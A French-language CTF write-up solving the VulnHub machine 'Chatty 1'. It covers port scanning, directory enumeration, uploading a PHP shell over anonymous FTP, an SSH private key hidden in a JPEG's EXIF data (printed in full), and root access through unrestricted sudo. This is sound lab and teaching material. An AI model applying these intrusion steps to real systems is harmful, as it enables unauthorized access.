---
title: Solution du CTF Chatty 1 de VulnHub
tags: [CTF, VulnHub]
---

### Shared root

[Chatty 1](https://vulnhub.com/entry/chatty-1-2-v5,289/) est un CTF simple proposé sur VulnHub.

Il a trois ports ouverts, le reste n'est pas filtré.

```console
$ sudo nmap -p- -T5 --script vuln -sCV 192.168.56.140 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 16:40 CEST
Nmap scan report for 192.168.56.140
Host is up (0.00014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| vulners: 
|   vsftpd 3.0.3: 
|       CVE-2021-30047  7.5     https://vulners.com/cve/CVE-2021-30047
|_      CVE-2021-3618   7.4     https://vulners.com/cve/CVE-2021-3618
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
--- snip ---
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp open  http    nginx 1.15.7
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| vulners: 
|   nginx 1.15.7: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
--- snip ---
|       CVE-2019-20372  5.3     https://vulners.com/cve/CVE-2019-20372
|_      PACKETSTORM:162830      0.0     https://vulners.com/packetstorm/PACKETSTORM:162830      *EXPLOIT*
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: nginx/1.15.7
|_http-dombased-xss: Couldn't find any DOM based XSS.
MAC Address: 08:00:27:8B:1F:03 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.84 seconds
```

Je trouve un dossier sur le serveur web à l'aide de `feroxbuster` :

```console
$ feroxbuster -u http://192.168.56.140/ -w DirBuster-0.12/directory-list-2.3-big.txt -n 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.140/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
WLD        7l        9w      153c Got 403 for http://192.168.56.140/e253ba522c624b47a7b802313681f54b (url length: 32)
WLD         -         -         - Wildcard response is static; auto-filtering 153 responses; toggle this behavior by using --dont-filter
WLD        7l        9w      153c Got 403 for http://192.168.56.140/e87ae1ec6cb3493ba2034d6767782075cdb6241141c24b0ab36266f4d1a8ee188e68afd6dfef495e878e28367da88d57 (url length: 96)
301        7l       11w      169c http://192.168.56.140/zamowienie
[####################] - 2m   1273561/1273561 0s      found:3       errors:0      
[####################] - 2m   1273563/1273561 8609/s  http://192.168.56.140/
```

Plus d'énumération me remonte d'autres dossiers :

```
301        7l       11w      169c http://192.168.56.140/zamowienie/data
301        7l       11w      169c http://192.168.56.140/zamowienie/css
301        7l       11w      169c http://192.168.56.140/zamowienie/js
```

J'ai aussi jeté un œil au service FTP qui accepte les connexions anonymes, et ça tombe bien : la racine FTP correspond à ce dossier `zamowienie`. Le sous dossier `data` est world writable, je dépose donc un shell PHP.

Une fois `reverse-ssh` lancé sur la machine, je découvre un compte `jpeguser`.

Vu que le dossier `zamowienie` contient une image JPEG, ça incite à lancer `stegoveritas` sur le fichier. Il me trouve en effet des informations utiles que l'on peut aussi obtenir via `exiftool` :

```console
$ exiftool tech-042712-004.jpg 
ExifTool Version Number         : 13.31
File Name                       : tech-042712-004.jpg
--- snip ---
URL                             : ssh://UID=1001@this-host
--- snip ---
Creator                         : roberto saporito
Description                     : Hacker World
Title                           : 136205219
Credit                          : Getty Images/iStockphoto
Instructions                    : -----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEA6fy0zQWsk5yrDim+kmwlrf2yG5LpyYyNWp72egWKHtwmMDWUX306JC60WXkmduPHxuaKQ75DULMlHRXJSq/4YBFmirp1TmPpY2JNzRBVYo2Hm/0tJZUUT62iMFa/1yC51XVldqUV9307XFOWtedVrEFA4YLlYElSOUlmKyp1rbFv+XDFpprMpSA6+oclUM9xTrDRF3z/Rr36g+TZvm+bsOip+0+p+SQMswySLGsH/7hvvJ4lhM1D0UNQrgHJEmmm/UA2rqSKN1PTrdUOedPjdV9kUQXyb5/MM+y1oT1rlUVOmWHOwu31x0NsbDndEEFaXJrE/XKW0EpLk6b4KVTCHQIDAQABAoIBAHvZr9WJeFRVq9D+VYnpRnR3AUxJEggFplheJbZmsjotauU/pv54KUs3kWx+jNaHMJpeMrcywSy49h8UBgzLYdtvumgZ07efeMyLHwU47QkSQsJVWw02gJ7AGEYf1MFI6DRNRFxte1gZaE8xS2eTQCzCCVaUU1cI2EXMTRDyE4HQk4jRRPUqEdhIbgJmwdHHFuVqvU24DBM/4TKj8N5Dg1PJx3H9n14HqOIRBTrryh2S3d5JljNafaUJGRqTeD7R3bXvABvZgEKDc5kwXrre53kfBLfZr8RjjYuUpbEV7t9YY3NMkfnbdnRYFHRE/Dk/i9aLdJhlHOTMI4JC3QGKXR0CgYEA95f5DS610T+nWp7nRh1pRc3OqQTKhYqEgJ9AsqEW/uO8xqOTyWnUMD3N7VBWgXhitdzQlrE9ZZsMeBoe9OVimfzwahi5fmXbSIo0REgys47uv/t1jDme8DKJiKOIBxRk4qpM9IRDjx8sYmQvWh35Xna0xOdlf2+9AdLRE1oQySsCgYEA8e53/suTEqe0U48MkXb6Jz+40Q3ABONBxnKuLaMNOQ2TH4q8UTzz16IyNs/HHiy7gX+S1xNgv2O8MRJugj4WxfqaEdyJ9pndocxJpEJ1Wwci9I/Jxet4xnZuOpCInolecvJ0MsNYTDkudt/Y2y2lgD2MAHxaWVTmHB7huMN97dcCgYEA08SCWgoXrM+a3mGHQmspfXDYT6wvZCTjy/dqKN6rgntbHTMP1nfT6ycRmObb9oT3OMGTDzCtaNhCw/7jd2cy/K5hGv3muft4oQTES5rM8tNP1ZjII5WtIZi4Fcx5LkT9PPmYNJNkDWgGWGmELrnwbiFt3/Ri1arGqGaeOMUSEl0CgYEAlUJr083jCgJfdaHuvhwqT2a37npOOnW+0eFU5qEO+mEOoMomTvSM+D+APWLJVSuB7242uOyiptGwfJIDjeUihbiLr3Nhxru9CiKQWIAMCUII5duEP9B77e2JKiabszvLAp3k5KCybCxnJz4Je4fY8JqIMpCF6VFAup6u4h/yJHcCgYB6GKXdQtukguvq5ahhe6oLSpVj5dkE7bSHu3cGIt/7km0DETzjS34UkaYsjJYUvuS0F8k3aJuUtBZtTS5DmPtKWJ5zKMNvGMvfvW7sZwLjThFuPbIk1xnTeQFCbWOSEo1Ow2GGNR6qbJ79W/mMDrFtkHyXTNSxSHkq2h/F+jvfMw==-----END RSA PRIVATE KEY-----
Source                          : iStockphoto
Document ID                     : adobe:docid:photoshop:3a6116d4-3f61-11e1-9aee-e5feb9136a43
Web Statement                   : http://www.gettyimages.com
DCT Encode Version              : 100
--- snip ---
```

Au passage, j'ai remarqué que parmi les ports en écoute (une fois le shell obtenu), il y a SNMP sur le port UDP 161. De plus `snmpwalk` est présent sur le système.

```console
www-data@ctflabs-chatty1:/$ snmpwalk -v 2c -c public 127.0.0.1
iso.3.6.1.2.1.1.1.0 = STRING: "Linux ctflabs-chatty1 4.15.0-39-generic #42-Ubuntu SMP Tue Oct 23 15:48:01 UTC 2018 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (138055) 0:23:00.55
iso.3.6.1.2.1.1.4.0 = STRING: "Me <me@example.org>"
iso.3.6.1.2.1.1.5.0 = STRING: "ctflabs-chatty1"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (17) 0:00:00.17
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (17) 0:00:00.17
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (17) 0:00:00.17
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (17) 0:00:00.17
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (17) 0:00:00.17
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (17) 0:00:00.17
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (17) 0:00:00.17
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (17) 0:00:00.17
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (17) 0:00:00.17
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (17) 0:00:00.17
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (17) 0:00:00.17
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (147795) 0:24:37.95
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 07 15 0C 03 00 00 2D 03 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-4.15.0-39-generic root=/dev/mapper/VGDisk-home ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 112
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

### Spellcheck

À ce stade, autant oublier ça et se concentrer sur la clé RSA extraire des Exif.

```console
$ ssh -i jpeguser.key jpeguser@192.168.56.140
Load key "jpeguser.key": error in libcrypto
jpeguser@192.168.56.140's password:
```

La clé n'est pas bien formatée avec les espaces et retours à la ligne ont été supprimés.

J'ai demandé à Claude AI de remettre au propre et ça marchait :

```console
$ ssh -i jpeguser.key jpeguser@192.168.56.140
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul 21 12:26:49 -03 2025

  System load:  0.08              Processes:           118
  Usage of /:   40.0% of 8.24GB   Users logged in:     0
  Memory usage: 43%               IP address for eth0: 192.168.56.140
  Swap usage:   0%

  => There is 1 zombie process.


166 packages can be updated.
97 updates are security updates.


Last login: Thu Nov 29 15:49:16 2018 from 192.168.0.82
$ sudo -l
Matching Defaults entries for jpeguser on ctflabs-chatty1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jpeguser may run the following commands on ctflabs-chatty1:
    (ALL : ALL) NOPASSWD: ALL
$ sudo su
root@ctflabs-chatty1:/home/jpeguser# cd /root
root@ctflabs-chatty1:~# ls
flag.txt
root@ctflabs-chatty1:~# cat flag.txt 
Congratulations you got the flag!

Let me know what you thought on twitter. I'm @helvioju

I'm always working on new challenges. Follow me for updates.

My Best Regards 
Helvio Junior (M4v3r1cK)
```


